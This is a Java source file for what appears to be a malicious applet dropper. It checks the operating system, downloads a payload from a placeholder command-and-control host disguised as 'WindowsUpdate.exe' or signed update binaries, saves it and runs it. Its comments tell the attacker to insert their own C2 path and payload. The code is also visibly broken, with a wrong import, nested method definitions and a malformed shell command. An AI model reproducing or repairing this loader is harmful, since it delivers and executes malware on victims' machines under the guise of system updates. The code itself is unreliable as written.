import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.net.URL;
import java.applet.Applet;

public class BufferOil extends Applet {

    private static String OS = System.getProperty("os.name").toLowerCase();

    public static void main(String [] args) {

        if (isWindows()) {
            try {
                // Change to name of payload for target to run.
                String fileName = "WindowsUpdate.exe";

                // Change to attacker C2 path.
                URL link = new URL("https://www.c2url.com/WindowsUpdate.exe");
                InputStream in = new BufferedInputStream(link.openStream());
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                byte [] buf = new byte[1024];
                int n = 0;
                while (-1!=(n=in.read(buf)))
                    {out.write(buf, 0, n);
                } 
                out.close();
                in.close();
                byte[] response = out.toByteArray();
                FileOutputStream fos = new FileOutputStream(fileName);
                fos.write(response);
                fos.close();
                // Change the name to your own payload.
                Process process = new ProcessBuilder("WindowsUpdate.exe").start();
            } catch(IOException ioe) {}
            } else if (isMac()) {
            try {
                // Update the name of the mac binary.
                String fileName = "SignedMacUpdateBinary";
                URL link = new URL("https://www.c2url.com/SignedMacUpdateBinary");
                InputStream in = new BufferedInputStream(link.openStream());
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                byte [] buf = new byte[1024];
                int n = 0;
                while (-1!=(n=in.read(buf)))
                    {out.write(buf, 0, n);
                } 
                out.close();
                in.close();
                byte[] response = out.toByteArray();
                FileOutputStream fos = new FileOutputStream(fileName);
                fos.write(response);
                fos.close();
                // Change the name to your own payload.
                Process process = new ProcessBuilder("SignedMacUpdateBinary").start();
            } catch(IOException ioe) {}

            } else if (isLinux()) {
            try {
                // Update the name of the mac binary.
                String fileName = "SignedNixBinary";
                URL link = new URL("https://www.c2url.com/SignedNixBinary");
                InputStream in = new BufferedInputStream(link.openStream());
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                byte [] buf = new byte[1024];
                int n = 0;
                while (-1!=(n=in.read(buf)))
                    {out.write(buf, 0, n);
                } 
                out.close();
                in.close();
                byte[] response = out.toByteArray();
                FileOutputStream fos = new FileOutputStream(fileName);
                fos.write(response);
                fos.close();
                // Change the name to your own payload.
                Process process = new ProcessBuilder("chmod +x SignedNixBinary;./SignedNixBinary").start();
            } catch(IOException ioe) {}
            } else {
                public static boolean isWindows() {
                    return (OS.indexOf("win") >= 0);
                }
                public static boolean isMac() {
                    return (OS.indexOf("mac") >= 0);
                }
                public static boolean isLinux() {
                    return (OS.indexOf("nux") >= 0);
                }
            }

            }
    }
}
